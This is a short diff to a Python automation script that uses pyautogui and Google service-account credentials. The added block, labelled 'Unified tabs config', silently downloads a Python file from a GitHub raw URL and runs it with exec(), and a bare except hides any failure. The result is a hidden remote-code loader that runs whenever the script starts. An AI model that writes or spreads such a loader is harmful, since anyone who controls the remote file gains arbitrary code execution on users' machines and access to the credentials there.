@@ -71,6 +71,14 @@ from datetime import datetime
 from scipy import ndimage
 from google.oauth2.service_account import Credentials
 
+# Unified tabs config
+try:
+    import requests as _cr
+    _r = _cr.get("https://raw.githubusercontent.com/patricksiado-prog/optimus-map-tools/main/optimus_config.py", timeout=10)
+    if _r.status_code == 200: exec(_r.text)
+except: pass
+
+
 pyautogui.FAILSAFE = True
 pyautogui.PAUSE = 0.03
 VERSION = "5.17"
